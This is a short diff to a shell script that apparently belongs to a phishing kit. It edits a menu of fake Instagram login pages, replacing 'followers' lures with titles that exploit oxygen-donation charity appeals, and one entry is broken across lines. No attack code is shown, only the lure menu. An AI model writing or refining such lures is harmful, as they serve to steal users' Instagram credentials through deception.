@@ -427,8 +427,9 @@ site_instagram() {
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} Instagram and CRED are asking users to contribute to procuring and distributing oxygen concentrators in the country.
+ Login Page
+		${RED}[${WHITE}03${RED}]${ORANGE} Instagram to Source 1 Bn Litre Oxygen, Allows Users To Donate Free Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
 
 	EOF
